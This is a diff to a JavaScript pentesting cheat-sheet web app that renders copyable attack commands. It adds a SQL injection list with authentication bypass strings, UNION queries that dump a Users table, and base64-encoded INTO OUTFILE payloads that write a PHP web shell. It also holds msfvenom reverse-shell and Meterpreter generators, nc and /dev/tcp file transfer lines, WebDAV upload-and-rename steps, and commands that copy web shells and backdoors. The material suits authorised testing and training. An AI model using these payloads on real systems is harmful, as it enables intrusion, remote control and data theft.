@@ -99,6 +99,10 @@ $(function () {
   privesc.setup(privescLhost, privescLport);
   privesc.draw(privescLhost, privescLport);
 
+  // --- Setup SQL Injection list ---
+  const sqlinj = new SqlInj('#mytoolSqlInj', ['#sqlinjList'], {})
+  sqlinj.setup();
+  sqlinj.draw();
 
   // URLのハッシュ(#以降の文字列)で初期表示ページの切り替え
   const myTabButton = document.querySelector(`#myTab button[data-bs-target="${location.hash}"]`);
@@ -153,7 +157,9 @@ class MyTool {
         // Create
         this.draw(...Object.values(info));
         // Set LHOST and LPORT info into session storage.
-        window.sessionStorage.setItem(this.STORAGE_KEY, JSON.stringify(info));
+        if (this.STORAGE_KEY) {
+          window.sessionStorage.setItem(this.STORAGE_KEY, JSON.stringify(info));
+        }
       }
     }
 
@@ -296,12 +302,12 @@ class RevShell extends MyTool {
       {'title': 'Windows', 'cmd': 'msfvenom -p windows/shell_reverse_tcp LHOST={0} LPORT={1} -f exe > win_rshell_{0}_{1}.exe'},
       {'title': 'Linux', 'cmd': 'msfvenom -p linux/x86/shell_reverse_tcp LHOST={0} LPORT={1} -f elf > lin_rshell_{0}_{1}.elf'},
       {'title': 'PHP', 'cmd': 'msfvenom -p php/reverse_php LHOST={0} LPORT={1} -f raw > php_rshell_{0}_{1}.php'},
-      {'title': 'Java', 'cmd': 'msfvenom -p java/jsp_shell_reverse_tcp LHOST={0} LPORT={1} -f raw > war_rshell_{0}_{1}.war'},
+      {'title': 'Java (.war)', 'cmd': 'msfvenom -p java/jsp_shell_reverse_tcp LHOST={0} LPORT={1} -f raw > war_rshell_{0}_{1}.war'},
       {'title': 'ASPX', 'cmd': 'msfvenom -p windows/shell_reverse_tcp LHOST={0} LPORT={1} -f aspx > aspx_rshell_{0}_{1}.aspx'},
       {'title': 'Meterpreter: Windows', 'cmd': 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe > win_met_{0}_{1}.exe'},
       {'title': 'Meterpreter: Linux', 'cmd': 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf > lin_met_{0}_{1}.elf'},
       {'title': 'Meterpreter: PHP', 'cmd': 'msfvenom -p php/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f raw > php_met_{0}_{1}.php'},
-      {'title': 'Meterpreter: Java', 'cmd': 'msfvenom -p java/meterpreter/reverse_http LHOST={0} LPORT={1} -f raw > war_met_{0}_{1}.war'},
+      {'title': 'Meterpreter: Java (.war)', 'cmd': 'msfvenom -p java/meterpreter/reverse_http LHOST={0} LPORT={1} -f raw > war_met_{0}_{1}.war'},
       {'title': 'Meterpreter: ASPX', 'cmd': 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f aspx > aspx_met_{0}_{1}.aspx'},
     ];
   }
@@ -350,7 +356,7 @@ class UpDown extends MyTool {
     super(...args);
 
     // LHOST: {0}, LPORT: {1}, FILE: {2}
-    this.targetContents[0] = [
+    this.targetContents['1.Upload'] = [
       {'title': '1. @Kali (bash)', 'cmd': 'nc -lnvp {1} < {2}'},
       {'title': '2. cat', 'cmd': 'cat < /dev/tcp/{0}/{1} > {2}'},
       {'title': '1. @Kali (curl, wget)', 'cmd': 'python3 -m http.server {1}'},
@@ -362,7 +368,7 @@ class UpDown extends MyTool {
     ];
 
     // LHOST: {0}, LPORT: {1}, FILE: {2}
-    this.targetContents[1] = [
+    this.targetContents['2.Download'] = [
       {'title': '1. @Kali (bash)', 'cmd': 'nc -lvnp {1} > {2}'},
       {'title': '2. bash', 'cmd': 'cat {2} > /dev/tcp/{0}/{1}'},
       {'title': '1. @Kali (curl)', 'cmd': 'wget https://gist.githubusercontent.com/touilleMan/eb02ea40b93e52604938/raw/b5b9858a7210694c8a66ca78cfed0b9f6f8b0ce3/SimpleHTTPServerWithUpload.py'},
@@ -442,18 +448,30 @@ class Web extends MyTool {
   constructor(...args) {
     super(...args);
 
-    this.targetContents['1'] = [
+    this.targetContents['1.WAPT'] = [
+      {'title': 'Check Header', 'cmd': 'curl -v "{0}'},
       {'title': 'gobuster', 'cmd': 'gobuster dir -w /usr/share/wordlists/dirb/common.txt -u "{0}"'},
       {'title': 'nikto', 'cmd': 'nikto --url "{0}"'},
+      {'title': 'WebDAV', 'cmd': 'curl -v -X OPTIONS "{0}"'},
       {'title': 'WebDAV', 'cmd': 'davtest -url "{0}"'},
       {'title': 'WebDAV', 'cmd': `curl -v -X PUT '{0}/{1}.php' -d @{1}.php`},
       {'title': '1. PUT txt file', 'cmd': `curl -v -X PUT '{0}/{1}.txt' --data-binary @{1}.php`},
       {'title': '2. MOVE from txt to php', 'cmd': `curl -v -X MOVE '{0}/{1}.txt' --header 'Destination: {0}/{1}.php'`},
+      {'title': 'Wordpress', 'cmd': 'wpscan --disable-tls-checks --url "{0}'},
+      {'title': '1. CMSmap', 'cmd': 'git clone https://github.com/Dionach/CMSmap && cd CMSmap && pip3 install .'},
+      {'title': '2. CMSmap', 'cmd': 'cmsmap "{0}"'},
     ];
 
-    this.targetContents['2'] = [
-      {'title': 'WebShell PHP', 'base64': 'Jmx0OyZxdWVzdDtwaHAgaWYmbHBhcjtpc3NldCZscGFyOyZkb2xsYXI7Jmxvd2JhcjtSRVFVRVNUJmxzcWI7JmFwb3M7Y21kJmFwb3M7JnJzcWI7JnJwYXI7JnJwYXI7JmxjdWI7IGVjaG8gJnF1b3Q7Jmx0O3ByZSZndDsmcXVvdDsmc2VtaTsgJmRvbGxhcjtjbWQgJmVxdWFsczsgJmxwYXI7JmRvbGxhcjsmbG93YmFyO1JFUVVFU1QmbHNxYjsmYXBvcztjbWQmYXBvczsmcnNxYjsmcnBhcjsmc2VtaTsgc3lzdGVtJmxwYXI7JmRvbGxhcjtjbWQmcnBhcjsmc2VtaTsgZWNobyAmcXVvdDsmbHQ7JnNvbDtwcmUmZ3Q7JnF1b3Q7JnNlbWk7IGRpZSZzZW1pOyAmcmN1YjsgJnF1ZXN0OyZndDs='},
-    ]
+    this.targetContents['2.WebShell'] = [
+      {'title': 'JSP', 'cmd': 'cp /usr/share/webshells/jsp/cmdjsp.jsp cmd.jsp'},
+      {'title': 'ASP', 'cmd': 'cp /usr/share/webshells/asp/cmdasp.asp cmd.asp'},
+      {'title': 'ASP', 'cmd': 'cp /usr/share/webshells/asp/cmd-asp-5.1.asp cmd.asp'},
+      {'title': 'ASPX', 'cmd': 'cp /usr/share/webshells/aspx/cmdasp.aspx cmd.aspx'},
+      {'title': 'PHP', 'cmd': 'cp /usr/share/webshells/php/simple-backdoor.php cmd.php'},
+      {'title': 'PHP', 'cmd': 'cp /usr/share/webshells/php/qsd-php-backdoor.php cmd.php'},
+      {'title': 'PHP', 'cmd': 'cp /usr/share/webshells/php/php-backdoor.php cmd.php'},
+      {'title': 'Perl (CGI)', 'cmd': 'cp /usr/share/webshells/perl/perlcmd.cgi cmd.cgi'},
+    ];
   }
 
   drawList(index, targetContent, url, filename) {
@@ -541,7 +559,7 @@ class Osint extends MyTool {
       {'title': 'dig - PTR (Reverse-lookup Pointer records)', 'cmd': 'dig PTR {0}'},
       {'title': 'dig - SOA (Start of Authority records)', 'cmd': 'dig SOA {0}'},
       {'title': 'dig - TXT (Text records)', 'cmd': 'dig TXT {0}'},
-      {'title': 'Zone Transfer', 'cmd': 'dig axfr {0} @IPADDR'},
+      {'title': 'Zone Transfer', 'cmd': 'dig axfr HOSTNAME @IPADDR'},
     ];
 
     this.targetContents['2.GoogleDorks'] = [
@@ -609,6 +627,62 @@ class PrivEsc extends MyTool {
       cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
       cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
       // Template
+      $(this.targetCSSSelectors[index]).append(`
+      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
+        <div class="ms-2 me-auto" style="width: 80%">
+          <div class="fw-bold">${title}</div>
+          <code class="copy_target">${cmd}</code>
+        </div>
+        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
+      </li>
+      `);
+    }
+  }
+}
+
+// ---- SQL Injection ---------------------------------------------------
+class SqlInj extends MyTool {
+  constructor(...args) {
+    super(...args);
+
+    this.targetContents['1'] = [
+      {'title': '1. sql - auth bypass', 'cmd': `' or 'x'='x`},
+      {'title': '1. sql - auth bypass', 'cmd': `') or ('x')=('x`},
+      {'title': '1. sql - auth bypass', 'cmd': `')) or (('x'))=(('x`},
+      {'title': '1. sql - auth bypass', 'cmd': `or 1=1-- `},
+      {'title': '1. sql - auth bypass', 'cmd': `' or 1=1-- `},
+      {'title': '1. sql - auth bypass', 'cmd': `') or 1=1--`},
+      {'title': '1. sql - auth bypass', 'cmd': `1/**/or/**/1=1/**/--`},
+      {'title': '2. sql - table columns number', 'cmd': `') order by 1 -- `},
+      {'title': '2. sql - determine table columns count', 'cmd': `') order by 2 -- `},
+      {'title': '2. sql - determine table columns count', 'cmd': `') order by 3 -- `},
+      {'title': '2. sql - determine table columns count', 'cmd': `') order by 4 -- `},
+      {'title': '2. sql - determine table columns count', 'cmd': `') order by 5 -- `},
+      {'title': '3. sql - SQLite > Tables', 'cmd': `ZZZ')) UnIoN SeLeCt 1,2,group_concat(tbl_name),null,null from sqlite_master where type='table' --`},
+      {'title': '3. sql - SQLite > Table Columns', 'cmd': `ZZZ')) UnIoN SeLeCt 1,2,sql,null,null from sqlite_master where type='table' and tbl_name='Users' --`},
+      {'title': '3. sql - SQLite > Table dump', 'cmd': `ZZZ')) union select username,email,password,null,null from Users --`},
+      {'title': 'sql', 'cmd': ``},
+      {'title': 'sql', 'cmd': ``},
+      {'title': 'sql', 'cmd': ``},
+      {'title': '9. sql', 'base64': 'U0VMRUNUICZxdW90OyZsdDsmcXVlc3Q7cGhwIHN5c3RlbSZscGFyOyZkb2xsYXI7Jmxvd2JhcjtHRVQmbHNxYjsmYXBvcztxJmFwb3M7JnJzcWI7JnJwYXI7JnNlbWk7ICZxdWVzdDsmZ3Q7JnF1b3Q7IGludG8gb3V0ZmlsZSAmcXVvdDsmc29sO3ZhciZzb2w7d3d3JnNvbDtodG1sJnNvbDtzaGVsbCZwZXJpb2Q7cGhwJnF1b3Q7'},
+      {'title': '9. sql', 'base64': 'c2VsZWN0ICZxdW90OyZsdDsmcXVlc3Q7cGhwIHN5c3RlbSZscGFyOyZkb2xsYXI7Jmxvd2JhcjtHRVQmbHNxYjsmYXBvcztxJmFwb3M7JnJzcWI7JnJwYXI7JnNlbWk7ICZxdWVzdDsmZ3Q7JnF1b3Q7IGludG8gb3V0ZmlsZSAmcXVvdDtDJmNvbG9uOyZic29sOyZic29sO3hhbXBwJmJzb2w7JmJzb2w7aHRkb2NzJmJzb2w7JmJzb2w7Y21kJnBlcmlvZDtwaHAmcXVvdDs='},
+      {'title': 'sql', 'cmd': ``},
+    ];
+  }
+
+  drawList(index, targetContent, lhost, lport) {
+    for (let i = 0; i < targetContent.length; i++) {
+      const content = targetContent[i];
+      let title = content.title;
+      let cmd = content.cmd;
+      // cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
+      // cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
+      // Template
+      if (content.base64) {
+        // base64デコードする
+        cmd = atob(content.base64);
+      }
+
       $(this.targetCSSSelectors[index]).append(`
       <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
         <div class="ms-2 me-auto" style="width: 80%">
